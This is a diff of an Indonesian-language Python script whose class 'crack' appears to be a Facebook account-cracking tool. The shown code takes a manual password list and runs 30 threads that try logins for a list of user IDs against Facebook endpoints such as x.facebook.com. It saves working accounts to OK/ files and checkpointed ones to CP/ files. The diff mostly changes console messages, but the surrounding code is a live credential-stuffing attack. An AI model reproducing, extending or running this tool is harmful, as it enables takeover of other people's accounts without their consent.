@@ -388,23 +388,23 @@ class crack:
 			exit()
 	
 	def manual(self):
-		print (f"{P} Contoh: sayang,anjing,123456")
-		pwek=input(" Masukan password: ")
+		print (f"\n{P} ! contoh: sayang,anjing,123456")
+		pwek=input(" ? password: ")
 		if pwek in(''):
-			exit("\n jangan kosong")
+			exit("\n ! jangan kosong")
 		elif len(pwek)<=5:
-			exit("\n password minimal 6 huruf")
+			exit("\n ! password minimal 6 huruf")
 		else:
 			pass 
-		print ('\n \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode free')
+		print (' \x1b[1;96m[\x1b[1;97m1\x1b[1;96m] \x1b[1;97mMethode free')
 		print (' \x1b[1;96m[\x1b[1;97m2\x1b[1;96m] \x1b[1;97mMethode mbasic')
 		print (' \x1b[1;96m[\x1b[1;97m3\x1b[1;96m] \x1b[1;97mMethode mobile')
 		print (' \x1b[1;96m[\x1b[1;97m4\x1b[1;96m] \x1b[1;97mMethode api')
-		men=input("\n \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
+		men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
 		print (f"""
- \x1b[1;97m⚡ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
- ⚡ akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
- ⚡ crack sedang berjalan... 
+ \x1b[1;97makun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
+ akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
+ crack sedang berjalan... 
 		""")
 		with Romz_Xyz(max_workers=30) as titid:
 			for akun in id:
@@ -420,16 +420,16 @@ class crack:
 				elif men in['4']:
 					titid.submit(self.__romz__, uid, pwx,  "x.facebook.com")
 				else:
-					exit("\n isi yang benar")
+					exit("\n ! isi yang benar")
 					
 		self.hasil(ok,cp)
 		
 	def langsung(self):
 		men=input(" \x1b[1;96m[\x1b[1;97m?\x1b[1;96m] \x1b[1;97mPILIH :\x1b[1;93m ")
 		print (f"""
- {P}⚡ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
- ⚡ akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
- ⚡ crack sedang berjalan... 
+ {P}+ akun {H}OK {P}tersimpan di:{H} OK/{waktu}.txt{P}
+ + akun {K}CP {P}tersimpan di:{K} CP/{waktu}.txt{P}
+ + crack sedang berjalan... 
 		""")
 		with Romz_Xyz(max_workers=30) as titid:
 			for akun in id:
@@ -469,7 +469,7 @@ class crack:
 	def __romz__(self, user, peweh, url_log):
 		global ok,cp,loop 
 		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
-		print (f"\r {komtol}• {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
+		print (f"\r- {komtol}• {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
 		for pw in peweh:
 			try: 
 				ses = requests.Session()
@@ -541,7 +541,6 @@ class crack:
 				time.sleep(3)
 			
 		loop+=1
-
 
  #--- methode 2
 	def __validate__(self, uid, pwx, url_log):
